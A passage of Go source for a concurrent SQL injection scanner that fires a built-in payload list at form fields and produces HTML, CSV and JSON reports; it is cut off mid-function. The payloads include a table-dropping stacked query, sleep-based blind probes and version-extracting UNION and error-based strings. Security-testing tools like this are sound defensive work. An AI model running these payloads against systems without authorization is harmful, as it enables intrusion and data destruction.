package main

// main.go
// Enhanced SQLi tester v3.0: Multi-URL support, expanded payloads, concurrency,
// JSON/HTML/CSV reports, custom headers, proxy support, and improved detection.

import (
	"bufio"
	"crypto/tls"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

const version = "3.0.0"

// Comprehensive SQLi payload categories
var payloads = []string{
	// === Boolean-based blind SQLi ===
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR 1=1 --",
	"' OR 'a'='a",
	"\" OR \"1\"=\"1",
	"') OR ('1'='1",
	"admin' --",
	"' OR '1'='1' /*",
	"' OR '1'='1' #",
	"') OR '1'='1' -- -",
	"' OR 'x'='x",
	"\" OR \"x\"=\"x",
	"') OR ('x'='x",
	"' OR 1=1#",
	"\" OR 1=1 --",
	"OR 1=1",

	// === Numeric context ===
	"1 OR 1=1",
	"1' OR '1'='1",
	"1) OR (1=1",
	"1 AND 1=1",
	"1' AND '1'='1",

	// === Comment truncation ===
	"' -- -",
	"' #",
	"') --",
	"') #",
	"';--",
	"'/*",

	// === UNION-based (column discovery) ===
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL,NULL--",
	"' UNION SELECT 1,2,3-- -",
	"' UNION SELECT 1,2,3,4-- -",
	"' UNION ALL SELECT NULL--",
	"' UNION ALL SELECT NULL,NULL--",
	"\" UNION SELECT NULL--",

	// === Error-based SQLi ===
	"' AND (SELECT 1 FROM information_schema.tables LIMIT 1)='1",
	"' AND (SELECT 1 FROM pg_sleep(0))='1",
	"' AND extractvalue(1,concat(0x7e,version()))--",
	"' AND updatexml(1,concat(0x7e,version()),1)--",
	"' AND (SELECT 1 FROM dual WHERE 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1)))--",

	// === Time-based blind SQLi (MySQL/MariaDB) ===
	"' OR SLEEP(5)-- ",
	"\" OR SLEEP(5)-- \"",
	"') OR SLEEP(5)-- ",
	"' AND SLEEP(5)--",
	"1 AND SLEEP(5)",
	"'; SELECT SLEEP(5)--",

	// === Time-based (PostgreSQL) ===
	"' OR pg_sleep(5)-- ",
	"' AND pg_sleep(5)--",
	"1 OR pg_sleep(5)--",
	"'; SELECT pg_sleep(5); --",

	// === Time-based (SQL Server) ===
	"'; WAITFOR DELAY '0:0:05'-- ",
	"' WAITFOR DELAY '0:0:05'--",
	"1; WAITFOR DELAY '0:0:05'--",

	// === Time-based (Oracle) ===
	"' || DBMS_LOCK.SLEEP(5) -- ",
	"' AND DBMS_LOCK.SLEEP(5)--",

	// === Stacked queries ===
	"'; SELECT 1; --",
	"'; DROP TABLE test; --",
	"1; SELECT version();--",

	// === Bypass techniques (encoding) ===
	"%27%20OR%20%271%27%3D%271",
	"%27%20OR%201%3D1--",
	"' OR '1'='1' %00",
	"' OR/**/'1'='1",
	"' OR/**/1=1--",

	// === Advanced bypass ===
	"' /*!OR*/ 1=1--",
	"' OR 'a'LIKE'a",
	"' OR 1 LiKE 1--",
	"admin'--",
	"admin' or '1'='1'--",
	"' UNION SELECT @@version--",

	// === Second-order SQLi detection ===
	"test' AND 1=1--",
	"test' AND 1=2--",

	// === NoSQL injection patterns ===
	"' || '1'=='1",
	"' && '1'=='1",
	"[$ne]=1",
	"';return true;var foo='",
}

// Time-based payload indicators
var timePayloadIndicators = []string{
	"sleep(", "SLEEP(", "pg_sleep", "WAITFOR", "DBMS_LOCK.SLEEP", "benchmark(",
}

// Expanded SQL error patterns
var sqlErrPatterns = []*regexp.Regexp{
	// Generic SQL errors
	regexp.MustCompile(`(?i)sql syntax|SQLSTATE|syntax error`),
	regexp.MustCompile(`(?i)mysql_fetch|mysql_query|mysql_num_rows`),
	regexp.MustCompile(`(?i)you have an error in your sql syntax`),

	// MySQL/MariaDB
	regexp.MustCompile(`(?i)mysql|mariadb`),
	regexp.MustCompile(`(?i)supplied argument is not a valid MySQL`),

	// PostgreSQL
	regexp.MustCompile(`(?i)postgres|postgresql|syntax error at or near`),
	regexp.MustCompile(`(?i)pg_query\(\)|pg_exec\(\)`),
	regexp.MustCompile(`(?i)unterminated quoted string`),

	// SQL Server
	regexp.MustCompile(`(?i)unclosed quotation mark after the character string`),
	regexp.MustCompile(`(?i)Microsoft OLE DB Provider|ADODB`),
	regexp.MustCompile(`(?i)SQLServer JDBC Driver`),
	regexp.MustCompile(`(?i)Incorrect syntax near`),

	// Oracle
	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
	regexp.MustCompile(`(?i)Oracle error|warning: oci_`),
	regexp.MustCompile(`(?i)quoted string not properly terminated`),

	// SQLite
	regexp.MustCompile(`(?i)SQLite.?Exception|near \\\".*\\\": syntax error`),
	regexp.MustCompile(`(?i)sqlite3_`),

	// ODBC/JDBC
	regexp.MustCompile(`(?i)odbc|jdbc`),
	regexp.MustCompile(`(?i)driver.*SQL`),

	// DB2
	regexp.MustCompile(`(?i)DB2 SQL error`),

	// Generic indicators
	regexp.MustCompile(`(?i)warning.*mysql_|fatal error.*mysql`),
	regexp.MustCompile(`(?i)Column count doesn't match`),
}

type Config struct {
	URLs           []string
	Method         string
	Fields         []string
	TimeoutSec     int
	Concurrency    int
	JSONOutput     string
	HTMLOutput     string
	CSVOutput      string
	ProxyURL       string
	Headers        map[string]string
	FollowRedirect bool
	VerifySSL      bool
	UserAgent      string
	Verbose        bool
	DelayMs        int
	MaxRetries     int
}

type Baseline struct {
	Status   int
	Len      int
	Duration time.Duration
	Headers  http.Header
}

type Task struct {
	URL     string
	Field   string
	Payload string
}

type Finding struct {
	URL                string    `json:"url"`
	Method             string    `json:"method"`
	Field              string    `json:"field"`
	Payload            string    `json:"payload"`
	PayloadType        string    `json:"payload_type"`
	Status             int       `json:"status"`
	BaselineStatus     int       `json:"baseline_status"`
	ResponseLen        int       `json:"response_len"`
	BaselineLen        int       `json:"baseline_len"`
	DurationMs         int64     `json:"duration_ms"`
	BaselineDurationMs int64     `json:"baseline_duration_ms"`
	Flagged            bool      `json:"flagged"`
	Severity           string    `json:"severity"`
	Reason             string    `json:"reason"`
	When               time.Time `json:"when"`
	Confidence         string    `json:"confidence"`
}

type Report struct {
	Version     string    `json:"version"`
	StartedAt   time.Time `json:"started_at"`
	FinishedAt  time.Time `json:"finished_at"`
	Method      string    `json:"method"`
	Fields      []string  `json:"fields"`
	URLs        []string  `json:"urls"`
	TimeoutSec  int       `json:"timeout_sec"`
	Concurrency int       `json:"concurrency"`
	Findings    []Finding `json:"findings"`
	Summary     Summary   `json:"summary"`
}

type Summary struct {
	TotalTests     int            `json:"total_tests"`
	Flagged        int            `json:"flagged"`
	HighSeverity   int            `json:"high_severity"`
	MediumSeverity int            `json:"medium_severity"`
	LowSeverity    int            `json:"low_severity"`
	ByURL          map[string]int `json:"vulnerabilities_by_url"`
}

func createHTTPClient(cfg *Config) (*http.Client, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !cfg.VerifySSL,
		},
		MaxIdleConns:        cfg.Concurrency * 2,
		MaxIdleConnsPerHost: cfg.Concurrency,
		IdleConnTimeout:     30 * time.Second,
	}

	if cfg.ProxyURL != "" {
		proxyURL, err := url.Parse(cfg.ProxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URL: %w", err)
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Timeout:   time.Duration(cfg.TimeoutSec) * time.Second,
		Transport: transport,
	}

	if !cfg.FollowRedirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	return client, nil
}

func fetchDetailed(client *http.Client, cfg *Config, target string, values url.Values) (int, string, time.Duration, http.Header, error) {
	var req *http.Request
	var err error

	if strings.ToUpper(cfg.Method) == "GET" {
		u, _ := url.Parse(target)
		q := u.Query()
		for k, vs := range values {
			for _, v := range vs {
				q.Add(k, v)
			}
		}
		u.RawQuery = q.Encode()
		req, err = http.NewRequest("GET", u.String(), nil)
	} else {
		req, err = http.NewRequest(cfg.Method, target, strings.NewReader(values.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	if err != nil {
		return 0, "", 0, nil, err
	}

	// Set custom headers
	req.Header.Set("User-Agent", cfg.UserAgent)
	for k, v := range cfg.Headers {
		req.Header.Set(k, v)
	}

	start := time.Now()
	resp, err := client.Do(req)
	dur := time.Since(start)

	if err != nil {
		return 0, "", dur, nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 500000)) // 500KB limit
	return resp.StatusCode, string(body), dur, resp.Header, nil
}

func getBaseline(client *http.Client, cfg *Config, target string) (Baseline, string, error) {
	v := url.Values{}
	for _, f := range cfg.Fields {
		v.Set(f, "baseline_test_value")
	}

	status, body, dur, headers, err := fetchDetailed(client, cfg, target, v)
	if err != nil {
		return Baseline{}, "", err
	}

	return Baseline{
		Status:   status,
		Len:      len(body),
		Duration: dur,
		Headers:  headers,
	}, body, nil
}

func determinePayloadType(payload string) string {
	pl := strings.ToLower(payload)

	if strings.Contains(pl, "union") && strings.Contains(pl, "select") {
		return "Union-based"
	}
	if strings.Contains(pl, "sleep") || strings.Contains(pl, "waitfor") ||
		strings.Contains(pl, "pg_sleep") || strings.Contains(pl, "dbms_lock") {
		return "Time-based"
	}
	if strings.Contains(pl, "information_schema") || strings.Contains(pl, "extractvalue") ||
		strings.Contains(pl, "updatexml") {
		return "Error-based"
	}
	if strings.Contains(pl, "' or") || strings.Contains(pl, "\" or") ||
		strings.Contains(pl, "or 1=1") {
		return "Boolean-based"
	}
	if strings.Contains(pl, "[$ne]") || strings.Contains(pl, "return true") {
		return "NoSQL"
	}

	return "Generic"
}

func determineSeverity(reason string, payloadType string) string {
	reasonLower := strings.ToLower(reason)

	// High severity indicators
	if strings.Contains(reasonLower, "sql error signature") {
		return "HIGH"
	}
	if strings.Contains(reasonLower, "response delayed") &&
		strings.Contains(payloadType, "Time-based") {
		return "HIGH"
	}

	// Medium severity indicators
	if strings.Contains(reasonLower, "response length deviated") {
		if strings.Contains(reasonLower, "deviated by") {
			return "MEDIUM"
		}
	}
	if strings.Contains(reasonLower, "status changed") {
		return "MEDIUM"
	}

	return "LOW"
}

func determineConfidence(severity string, reason string) string {
	reasonLower := strings.ToLower(reason)

	if severity == "HIGH" && strings.Contains(reasonLower, "sql error") {
		return "High"
	}
	if severity == "HIGH" && strings.Contains(reasonLower, "delayed") {
		return "Medium-High"
	}
	if severity == "MEDIUM" {
		return "Medium"
	}

	return "Low"
}

func analyze(baseline Baseline, status int, body string, dur time.Duration, payload string) (bool, string) {
	// 1. Check for SQL error signatures (highest confidence)
	for _, re := range sqlErrPatterns {
		if re.MatchString(body) {
			return true, "SQL error signature detected in response"
		}
	}

	// 2. Significant response length deviation
	lenDiff := abs(len(body) - baseline.Len)
	if lenDiff > 100 {
		// More specific thresholds
		if lenDiff > 500 {
			return true, fmt.Sprintf("Response length deviated by %d bytes (significant)", lenDiff)
		}
		if lenDiff > baseline.Len/2 { // More than 50% change
			return true, fmt.Sprintf("Response length deviated by %d bytes", lenDiff)
		}
	}

	// 3. HTTP status code change
	if status != baseline.Status {
		// Ignore common redirects unless dramatic
		if !(status >= 300 && status < 400 && baseline.Status >= 200 && baseline.Status < 300) {
			return true, fmt.Sprintf("Status changed: %d (baseline %d)", status, baseline.Status)
		}
	}

	// 4. Time-based detection (refined)
	if looksTimeBased(payload) {
		expectedDelay := 5 * time.Second // Our payloads use 5 second delays
		threshold := expectedDelay - (500 * time.Millisecond)

		if dur >= threshold && dur > baseline.Duration*3 {
			return true, fmt.Sprintf("Response delayed: %s (baseline %s, expected ~5s)",
				dur.Truncate(time.Millisecond), baseline.Duration.Truncate(time.Millisecond))
		}
	}

	// 5. Check for suspicious response patterns (false positive risk)
	if strings.Contains(body, "error in your SQL syntax") ||
		strings.Contains(body, "mysql_fetch_array") ||
		strings.Contains(body, "PostgreSQL query failed") {
		return true, "Suspicious database error pattern detected"
	}

	return false, ""
}

func looksTimeBased(p string) bool {
	pl := strings.ToLower(p)
	for _, ind := range timePayloadIndicators {
		if strings.Contains(pl, strings.ToLower(ind)) {
			return true
		}
	}
	return false
}

func abs(a int) int {
	if a < 0 {
		return -a
	}
	return a
}

func parseListCSV(s string) []string {
	if strings.TrimSpace(s) == "" {
		return nil
	}
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		pp := strings.TrimSpace(p)
		if pp != "" {
			out = append(out, pp)
		}
	}
	return out
}

func parseHeaders(s string) map[string]string {
	headers := make(map[string]string)
	if s == "" {
		return headers
	}

	pairs := strings.Split(s, ",")
	for _, pair := range pairs {
		kv := strings.SplitN(pair, ":", 2)
		if len(kv) == 2 {
			headers[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}
	}
	return headers
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	s := bufio.NewScanner(f)
	s.Buffer(make([]byte, 0, 1024), 1024*1024)
	var lines []string

	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		lines = append(lines, line)
	}
	return lines, s.Err()
}

func generateCSVReport(report Report, csvPath string) error {
	f, err := os.Create(csvPath)
	if err != nil {
		return err
	}
	defer f.Close()

	w := csv.NewWriter(f)
	defer w.Flush()

	// Write header
	headers := []string{
		"URL", "Method", "Field", "Payload", "Payload Type",
		"Status", "Baseline Status", "Response Length", "Baseline Length",
		"Duration (ms)", "Baseline Duration (ms)", "Flagged", "Severity",
		"Confidence", "Reason", "Timestamp",
	}
	if err := w.Write(headers); err != nil {
		return err
	}

	// Write findings
	for _, f := range report.Findings {
		row := []string{
			f.URL,
			f.Method,
			f.Field,
			f.Payload,
			f.PayloadType,
			fmt.Sprintf("%d", f.Status),
			fmt.Sprintf("%d", f.BaselineStatus),
			fmt.Sprintf("%d", f.ResponseLen),
			fmt.Sprintf("%d", f.BaselineLen),
			fmt.Sprintf("%d", f.DurationMs),
			fmt.Sprintf("%d", f.BaselineDurationMs),
			fmt.Sprintf("%t", f.Flagged),
			f.Severity,
			f.Confidence,
			f.Reason,
			f.When.Format(time.RFC3339),
		}
		if err := w.Write(row); err != nil {
			return err
		}
	}

	return nil
}

func generateHTMLReport(report Report, htmlPath string) error {
	f, err := os.Create(htmlPath)
	if err != nil {
		return err
	}
	defer f.Close()

	// Group findings by URL and field
	type URLStats struct {
		URL          string
		TotalTests   int
		Flagged      int
		HighSev      int
		MediumSev    int
		LowSev       int
		FieldResults map[string]struct{ Total, Flagged int }
	}

	urlStats := make(map[string]*URLStats)
	for _, finding := range report.Findings {
		if _, ok := urlStats[finding.URL]; !ok {
			urlStats[finding.URL] = &URLStats{
				URL:          finding.URL,
				FieldResults: make(map[string]struct{ Total, Flagged int }),
			}
		}

		us := urlStats[finding.URL]
		us.TotalTests++

		if finding.Flagged {
			us.Flagged++
			switch finding.Severity {
			case "HIGH":
				us.HighSev++
			case "MEDIUM":
				us.MediumSev++
			case "LOW":
				us.LowSev++
			}
		}

		fr := us.FieldResults[finding.Field]
		fr.Total++
		if finding.Flagged {
			fr.Flagged++
		}
		us.FieldResults[finding.Field] = fr
	}

	duration := report.FinishedAt.Sub(report.StartedAt).Round(time.Millisecond)

	// Write HTML (same structure as before but with severity badges)
	fmt.Fprintf(f, `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQLi Security Test Report v%s</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
        .header p { opacity: 0.9; font-size: 1.1em; }
        .summary {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }
        .summary-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
        }
        .summary-card h3 { color: #666; font-size: 0.9em; text-transform: uppercase; margin-bottom: 10px; }
        .summary-card .value { font-size: 2.5em; font-weight: bold; }
        .summary-card.safe .value { color: #28a745; }
        .summary-card.vulnerable .value { color: #dc3545; }
        .summary-card.neutral .value { color: #667eea; }
        .summary-card.high .value { color: #dc3545; }
        .summary-card.medium .value { color: #ffc107; }
        .summary-card.low .value { color: #17a2b8; }
        .section { padding: 30px; }
        .section h2 { color: #333; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px; }
        .url-block {
            margin-bottom: 30px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            overflow: hidden;
        }
        .url-header {
            padding: 15px 20px;
            background: #f8f9fa;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: background 0.2s;
        }
        .url-header:hover { background: #e9ecef; }
        .url-header h3 {
            font-size: 1.1em;
            color: #333;
            word-break: break-all;
            flex: 1;
        }
        .status-badge {
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.85em;
            margin-left: 15px;
        }
        .status-badge.vulnerable { background: #dc3545; color: white; }
        .status-badge.safe { background: #28a745; color: white; }
        .severity-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.75em;
            font-weight: bold;
            margin-left: 5px;
        }
        .severity-badge.HIGH { background: #dc3545; color: white; }
        .severity-badge.MEDIUM { background: #ffc107; color: #000; }
        .severity-badge.LOW { background: #17a2b8; color: white; }
        .url-content { padding: 20px; }
        .field-results {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .field-card {
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            padding: 15px;
            background: #fff;
        }
        .field-card.vulnerable { border-color: #dc3545; background: #fff5f5; }
        .field-card.safe { border-color: #28a745; background: #f0fff4; }
        .field-card h4 { margin-bottom: 10px; font-size: 1em; }
        .field-card .stats { font-size: 0.9em; color: #666; }
        .progress-bar {
            width: 100%%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 10px;
        }
        .progress-fill {
            height: 100%%;
            background: #dc3545;
            transition: width 0.3s;
        }
        .findings-table {
            width: 100%%;
            border-collapse: collapse;
            margin-top: 15px;
            font-size: 0.9em;
        }
        .findings-table th {
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
            font-weight: 600;
        }
        .findings-table td {
            padding: 10px 12px;
            border-bottom: 1px solid #e0e0e0;
        }
        .findings-table tr:hover { background: #f8f9fa; }
        .findings-table .flagged { background: #fff5f5; }
        .findings-table .safe-row { background: #f0fff4; }
        .payload { font-family: 'Courier New', monospace; background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-size: 0.85em; }
        .reason { color: #dc3545; font-weight: 500; }
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            color: #666;
            font-size: 0.9em;
        }
        .legend { margin-top: 10px; padding: 15px; background: #f8f9fa; border-radius: 6px; }
        .legend-item { display: inline-block; margin-right: 20px; font-size: 0.9em; }
        .legend-color { display: inline-block; width: 12px; height: 12px; border-radius: 2px; margin-right: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 SQL Injection Security Test Report</h1>
            <p>Comprehensive vulnerability assessment results (v%s)</p>
        </div>
        
        <div class="summary">
            <div class="summary-card neutral">
                <h3>Total URLs Tested</h3>
                <div class="value">%d</div>
            </div>
            <div class="summary-card neutral">
                <h3>Total Tests</h3>
                <div class="value">%d</div>
            </div>
            <div class="summary-card vulnerable">
                <h3>Vulnerabilities Found</h3>
                <div class="value">%d</div>
            </div>
            <div class="summary-card high">
                <h3>High Severity</h3>
                <div class="value">%d</div>
            </div>
            <div class="summary-card medium">
                <h3>Medium Severity</h3>
                <div class="value">%d</div>
            </div>
            <div class="summary-card low">
                <h3>Low Severity</h3>
                <div class="value">%d</div>
            </div>
            <div class="summary-card neutral">
                <h3>Test Duration</h3>
                <div class="value" style="font-size: 1.8em;">%s</div>
            </div>
            <div class="summary-card neutral">
                <h3>Method</h3>
                <div class="value" style="font-size: 1.5em;">%s</div>
            </div>
            <div class="summary-card neutral">
                <h3>Concurrency</h3>
                <div class="value">%d</div>
            </div>
        </div>
`, version, version, len(report.URLs), report.Summary.TotalTests, report.Summary.Flagged,
		report.Summary.HighSeverity, report.Summary.MediumSeverity, report.Summary.LowSeverity,
		duration, report.Method, report.Concurrency)

	fmt.Fprintf(f, `        <div class="section">
            <h2>📊 Detailed Results by URL</h2>
`)

	for _, targetURL := range report.URLs {
		us, ok := urlStats[targetURL]
		if !ok {
			continue
		}

		status := "safe"
		statusText := "✓ No Issues Detected"
		if us.Flagged > 0 {
			status = "vulnerable"
			statusText = fmt.Sprintf("⚠ %d Potential Vulnerabilities", us.Flagged)
			if us.HighSev > 0 {
				statusText += fmt.Sprintf(" (HIGH: %d)", us.HighSev)
			}
		}

		fmt.Fprintf(f, `            <div class="url-block">
                <div class="url-header">
                    <h3>%s</h3>
                    <span class="status-badge %s">%s</span>
                </div>
                <div class="url-content">
                    <div class="field-results">
`, targetURL, status, statusText)

		for _, field := range report.Fields {
			fr, ok := us.FieldResults[field]
			if !ok {
				continue
			}

			fieldStatus := "safe"
			if fr.Flagged > 0 {
				fieldStatus = "vulnerable"
			}

			vulnPct := 0
			if fr.Total > 0 {
				vulnPct = (fr.Flagged * 100) / fr.Total
			}

			fmt.Fprintf(f, `                        <div class="field-card %s">
                            <h4>Field: %s</h4>
                            <div class="stats">%d/%d payloads flagged</div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: %d%%"></div>
                            </div>
                        </div>
`, fieldStatus, field, fr.Flagged, fr.Total, vulnPct)
		}

		fmt.Fprintf(f, `                    </div>
                    <table class="findings-table">
                        <thead>
                            <tr>
                                <th>Field</th>
                                <th>Payload</th>
                                <th>Type</th>
                                <th>Status</th>
                                <th>Response Size</th>
                                <th>Duration (ms)</th>
                                <th>Severity</th>
                                <th>Result</th>
                            </tr>
                        </thead>
                        <tbody>
`)

		for _, finding := range report.Findings {
			if finding.URL != targetURL {
				continue
			}

			rowClass := "safe-row"
			resultText := "✓ No issues"
			severityBadge := ""

			if finding.Flagged {
				rowClass = "flagged"
				resultText = fmt.Sprintf(`<span class="reason">⚠ %s</span>`, finding.Reason)
				severityBadge = fmt.Sprintf(`<span class="severity-badge %s">%s</span>`,
					finding.Severity, finding.Severity)
			}

			fmt.Fprintf(f, `                            <tr class="%s">
                                <td>%s</td>
                                <td><code class="payload">%s</code></td>
                                <td>%s</td>
                                <td>%d</td>
                                <td>%d bytes</td>
                                <td>%d ms</td>
                                <td>%s</td>
                                <td>%s</td>
                            </tr>
`, rowClass, finding.Field, finding.Payload, finding.PayloadType, finding.Status,
				finding.ResponseLen, finding.DurationMs, severityBadge, resultText)
		}

		fmt.Fprintf(f, `                        </tbody>
                    </table>
                </div>
            </div>
`)
	}

	fmt.Fprintf(f, `        </div>
        
        <div class="footer">
            <p><strong>⚠ Security Notice:</strong> This report is for authorized security testing only.</p>
            <p>Generated: %s | Total Duration: %s | Version: %s</p>
            <div class="legend">
                <div class="legend-item"><span class="legend-color" style="background:#dc3545"></span> High Severity</div>
                <div class="legend-item"><span class="legend-color" style="background:#ffc107"></span> Medium Severity</div>
                <div class="legend-item"><span class="legend-color" style="background:#17a2b8"></span> Low Severity</div>
                <div class="legend-item"><span class="legend-color" style="background:#28a745"></span> No Issues Detected</div>
            </div>
        </div>
    </div>
</body>
</html>
`, report.FinishedAt.Format("2006-01-02 15:04:05"), duration, version)

	return nil
}

func main() {
	// Command-line flags
	singleURL := flag.String("url", "", "Target URL (single). Example: https://example.com/login")
	urlsCSV := flag.String("urls", "", "Comma-separated URLs to test")
	urlsFile := flag.String("urls-file", "", "Path to file with one URL per line")
	method := flag.String("method", "POST", "HTTP method: POST or GET")
	fields := flag.String("fields", "", "Comma-separated field names to test. Example: username,password")
	timeout := flag.Int("timeout", 15, "HTTP client timeout seconds")
	concurrency := flag.Int("concurrency", 6, "Number of concurrent workers")
	jsonOut := flag.String("out", "sqli_report.json", "Path to JSON report file")
	htmlOut := flag.String("html", "sqli_report.html", "Path to HTML report file")
	csvOut := flag.String("csv", "", "Path to CSV report file (optional)")
	proxyURL := flag.String("proxy", "", "Proxy URL (e.g., http://127.0.0.1:8080)")
	headersStr := flag.String("headers", "", "Custom headers (format: Key1:Value1,Key2:Value2)")
	userAgent := flag.String("user-agent", "SQLi-Tester/3.0", "Custom User-Agent string")
	followRedirect := flag.Bool("follow-redirects", true, "Follow HTTP redirects")
	verifySSL := flag.Bool("verify-ssl", true, "Verify SSL certificates")
	verbose := flag.Bool("verbose", false, "Verbose output")
	delayMs := flag.Int("delay", 0, "Delay between requests in milliseconds")
	maxRetries := flag.Int("retries", 2, "Maximum retries for failed requests")
	showVersion := flag.Bool("version", false, "Show version and exit")

	flag.Parse()

	if *showVersion {
		fmt.Printf("SQLi Tester v%s\n", version)
		return
	}

	// Parse configuration
	cfg := &Config{
		Method:         strings.ToUpper(*method),
		Fields:         parseListCSV(*fields),
		TimeoutSec:     *timeout,
		Concurrency:    *concurrency,
		JSONOutput:     *jsonOut,
		HTMLOutput:     *htmlOut,
		CSVOutput:      *csvOut,
		ProxyURL:       *proxyURL,
		Headers:        parseHeaders(*headersStr),
		UserAgent:      *userAgent,
		FollowRedirect: *followRedirect,
		VerifySSL:      *verifySSL,
		Verbose:        *verbose,
		DelayMs:        *delayMs,
		MaxRetries:     *maxRetries,
	}

	// Collect URLs
	urlList := []string{}
	if *urlsFile != "" {
		lines, err := readLines(*urlsFile)
		if err != nil {
			fmt.Printf("❌ Failed to read urls-file: %v\n", err)
			return
		}
		urlList = append(urlList, lines...)
	}
	urlList = append(urlList, parseListCSV(*urlsCSV)...)
	if *singleURL != "" {
		urlList = append(urlList, strings.TrimSpace(*singleURL))
	}

	// Deduplicate URLs
	uniq := map[string]struct{}{}
	finalURLs := make([]string, 0, len(urlList))
	for _, u := range urlList {
		u = strings.TrimSpace(u)
		if u == "" {
			continue
		}
		if _, ok := uniq[u]; ok {
			continue
		}
		uniq[u] = struct{}{}
		finalURLs = append(finalURLs, u)
	}
	cfg.URLs = finalURLs

	// Validate inputs
	if len(cfg.URLs) == 0 || len(cfg.Fields) == 0 {
		fmt.Println("❌ Missing required arguments")
		fmt.Println("\n📖 Usage Examples:")
		fmt.Println("  sqli-tester -url https://example.com/login -method POST -fields username,password")
		fmt.Println("  sqli-tester -urls https://a/login,https://b/login -fields user,pass")
		fmt.Println("  sqli-tester -urls-file urls.txt -fields user,pass -concurrency 10")
		fmt.Println("  sqli-tester -url https://site.com/search -method GET -fields q -proxy http://127.0.0.1:8080")
		fmt.Println("\n🔧 Additional Options:")
		fmt.Println("  -headers 'Authorization:Bearer token,X-Custom:value'")
		fmt.Println("  -user-agent 'Custom User Agent'")
		fmt.Println("  -verify-ssl=false  # For self-signed certificates")
		fmt.Println("  -csv report.csv    # Also generate CSV report")
		fmt.Println("  -delay 100         # 100ms delay between requests")
		fmt.Println("  -version           # Show version")
		return
	}

	// Create HTTP client
	client, err := createHTTPClient(cfg)
	if err != nil {
		fmt.Printf("❌ Failed to create HTTP client: %v\n", err)
		return
	}

	started := time.Now()
	fmt.Printf("\n🔍 SQLi Tester v%s\n", version)
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("📋 Configuration:\n")
	fmt.Printf("   URLs:        %d\n", len(cfg.URLs))
	fmt.Printf("   Method:      %s\n", cfg.Method)
	fmt.Printf("   Fields:      %s\n", strings.Join(cfg.Fields, ", "))
	fmt.Printf("   Payloads:    %d\n", len(payloads))
	fmt.Printf("   Concurrency: %d\n", cfg.Concurrency)
	fmt.Printf("   Timeout:     %ds\n", cfg.TimeoutSec)
	if cfg.ProxyURL != "" {
		fmt.Printf("   Proxy:       %s\n", cfg.ProxyURL)
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	// Get baselines
	fmt.Println("⏳ Computing baselines for each URL...")
	baselines := map[string]Baseline{}
	for _, u := range cfg.URLs {
		b, _, err := getBaseline(client, cfg, u)
		if err != nil {
			fmt.Printf("   ❌ Baseline failed for %s: %v\n", u, err)
			continue
		}
		baselines[u] = b
		fmt.Printf("   ✓ %s => status=%d len=%d dur=%s\n",
			u, b.Status, b.Len, b.Duration.Truncate(time.Millisecond))
	}

	if len(baselines) == 0 {
		fmt.Println("\n❌ No valid baselines; aborting.")
		return
	}

	fmt.Printf("\n🚀 Starting vulnerability scan...\n\n")

	// Build tasks
	tasks := make(chan Task, 1024)
	results := make(chan Finding, 1024)
	var wg sync.WaitGroup

	worker := func(workerID int) {
		defer wg.Done()
		for t := range tasks {
			// Skip URLs without baseline
			b, ok := baselines[t.URL]
			if !ok {
				continue
			}

			// Apply delay if configured
			if cfg.DelayMs > 0 {
